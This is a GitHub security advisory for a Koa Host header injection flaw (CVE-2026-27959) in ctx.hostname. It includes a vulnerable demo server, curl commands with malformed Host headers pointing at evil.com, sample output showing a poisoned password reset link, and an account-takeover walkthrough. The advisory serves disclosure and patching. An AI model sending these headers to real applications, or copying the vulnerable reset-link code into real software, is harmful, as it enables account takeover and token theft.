# [H] Koa has Host Header Injection via ctx.hostname

## Summary
Severity: High
Advisory: GHSA-7gcc-r8m5-44qm
CVE: CVE-2026-27959
CWE: CWE-20, CWE-74
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-02-26
Source: https://github.com/advisories/GHSA-7gcc-r8m5-44qm
Type: github-advisory

## Affected
- npm: `koa` — affected >=3.0.0 <3.1.2
- npm: `koa` — affected >=0 <2.16.4

## Details
## Summary

Koa's `ctx.hostname` API performs naive parsing of the HTTP Host header, extracting everything before the first colon without validating the input conforms to RFC 3986 hostname syntax. When a malformed Host header containing a `@` symbol (e.g., `evil.com:fake@legitimate.com`) is received, `ctx.hostname` returns `evil.com` - an attacker-controlled value. Applications using `ctx.hostname` for URL generation, password reset links, email verification URLs, or routing decisions are vulnerable to Host header injection attacks.

## Details

The vulnerability exists in Koa's hostname getter in `lib/request.js`:

```javascript
// Koa 2.16.1 - lib/request.js
get hostname() {
  const host = this.host;
  if (!host) return '';
  if ('[' === host[0]) return this.URL.hostname || ''; // IPv6 literal
  return host.split(':', 1)[0];
}
```

The `host` getter retrieves the raw header value with HTTP/2 and proxy support:

```javascript
// Koa 2.16.1 - lib/request.js
get host() {
  const proxy = this.app.proxy;
  let host = proxy && this.get('X-Forwarded-Host');
  if (!host) {
    if (this.req.httpVersionMajor >= 2) host = this.get(':authority');
    if (!host) host = this.get('Host');
  }
  if (!host) return '';
  return host.split(',')[0].trim();
}
```

### The Problem

The parsing logic simply splits on the first `:` and returns the first segment. There is no validation that the resulting string is a valid hostname per RFC 3986 Section 3.2.2.

**RFC 3986 Section 3.2.2** defines the host component as:

```
host = IP-literal / IPv4address / reg-name
reg-name = *( unreserved / pct-encoded / sub-delims )
unreserved = ALPHA / DIGIT / "-" / "." / "_" / "~"
sub-delims = "!" / "$" / "&" / "'" / "(" / ")" / "*" / "+" / "," / ";" / "="
```

The `@` character is explicitly NOT permitted in the host component - it is the delimiter separating userinfo from host in the authority component.

### Attack Vector

When an attacker sends:

```
Host: evil.com:fake@legitimate.com:3000
```

Koa parses this as:

| API | Returns | Notes |
|-----|---------|-------|
| `ctx.get('Host')` | `"evil.com:fake@legitimate.com:3000"` | Raw header |
| `ctx.hostname` | `"evil.com"` | **Attacker-controlled** |
| `ctx.host` | `"evil.com:fake@legitimate.com:3000"` | Raw header value |
| `ctx.origin` | `"http://evil.com:fake@legitimate.com:3000"` | Protocol + malformed host |

The `ctx.hostname` API returns `evil.com` because the parser splits on the first `:` without understanding that `evil.com:fake@legitimate.com` is a malformed authority component where `evil.com:fake` would be interpreted as userinfo by a proper URI parser.

### Additional Concern: `ctx.origin`

Koa's `ctx.origin` property concatenates protocol and host without validation:

```javascript
// lib/request.js
get origin() {
  return `${this.protocol}://${this.host}`;
}
```

Applications using `ctx.origin` for URL generation receive the full malformed Host header value, creating URLs with embedded credentials that browsers may interpret as userinfo.

### HTTP/2 Consideration

Koa explicitly checks `httpVersionMajor >= 2` to read the `:authority` pseudo-header:

```javascript
if (this.req.httpVersionMajor >= 2) host = this.get(':authority');
```

The same vulnerability applies - malformed `:authority` values containing userinfo would be accepted and parsed identically.

## PoC

### Setup

```javascript
// server.js
const Koa = require('koa'); 
const app = new Koa();

// Simulates password reset URL generation (common vulnerable pattern)
app.use(async ctx => {
  if (ctx.path === '/forgot-password') {
    const resetToken = 'abc123securtoken';
    const resetUrl = `${ctx.protocol}://${ctx.hostname}/reset?token=${resetToken}`;
    
    ctx.body = {
      message: 'Password reset link generated',
      resetUrl: resetUrl,
      debug: {
        rawHost: ctx.get('Host'),
        parsedHostname: ctx.hostname,
        origin: ctx.origin,
        protocol: ctx.protocol
      }
    };
  }
});

app.listen(3000, () => console.log('Server on http://localhost:3000'));
```

### Exploit

```bash
curl -H "Host: evil.com:fake@localhost:3000" http://localhost:3000/forgot-password
```

### Result

```json
{
  "message": "Password reset link generated",
  "resetUrl": "http://evil.com/reset?token=abc123securtoken",
  "debug": {
    "rawHost": "evil.com:fake@localhost:3000",
    "parsedHostname": "evil.com",
    "origin": "http://evil.com:fake@localhost:3000",
    "protocol": "http"
  }
}
```

The password reset URL points to `evil.com` instead of the legitimate server. In a real attack:

1. Attacker requests password reset for victim's email with malicious Host header
2. Server generates reset link using `ctx.hostname` → `https://evil.com/reset?token=SECRET`
3. Victim receives email with poisoned link
4. Victim clicks link, token is sent to attacker's server
5. Attacker uses token to reset victim's password

### Additional Test Cases

```bash
# Basic injection
curl -H "Host: evil.com:x@legitimate.com" http://localhost:3000/forgot-password
# Result: hostname = "evil.com"

# With port preservation attempt
curl -H "Host: evil.com:443@legitimate.com:3000" http://localhost:3000/forgot-password  
# Result: hostname = "evil.com"

# Unicode/encoded variations
curl -H "Host: evil.com:x%40legitimate.com" http://localhost:3000/forgot-password
# Result: hostname = "evil.com"
```

### Deployment Consideration

For this attack to succeed in production, the malicious Host header must reach the Koa application. This occurs when:

1. **No reverse proxy** - Application directly exposed to internet
2. **Misconfigured proxy** - Proxy doesn't override/validate Host header
3. **Proxy trust enabled** (`app.proxy = true`) - `X-Forwarded-Host` can be injected
4. **Default virtual host** - Server is the catch-all for unrecognized Host headers

## Impact

### Vulnerability Type

- CWE-20: Improper Input Validation
- CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax

### Attack Scenarios

**1. Password Reset Poisoning (High Severity)**
- Attacker hijacks password reset tokens by poisoning reset URLs
- Requires victim to click link in email
- Results in account takeover

**2. Email Verification Bypass**
- Attacker poisons email verification links
- Can verify attacker-controlled email on victim accounts

**3. OAuth/SSO Callback Manipulation**
- Applications using `ctx.hostname` for OAuth redirect URIs
- Attacker redirects OAuth callbacks to malicious server
- Results in token theft

**4. Web Cache Poisoning**
- If responses are cached without Host in cache key
- Poisoned URLs served to all users
- Persistent XSS/phishing via cached responses

**5. Server-Side Request Forgery (SSRF)**
- Internal routing decisions based on `ctx.hostname`
- Attacker manipulates which backend receives requests

### Who Is Impacted

- **Direct impact**: Any Koa application using `ctx.hostname` or `ctx.origin` for URL generation without additional validation
- **Common patterns**: Password reset, email verification, webhook URL generation, multi-tenant routing, OAuth implementations

## References
- https://github.com/koajs/koa/security/advisories/GHSA-7gcc-r8m5-44qm
- https://nvd.nist.gov/vuln/detail/CVE-2026-27959
- https://github.com/koajs/koa/commit/55ab9bab044ead4e82c70a30a4f9dc0fc9c1b6df
- https://github.com/koajs/koa/commit/b76ddc01fdb703e51652b0fd131d16394cadcfeb
- https://github.com/koajs/koa
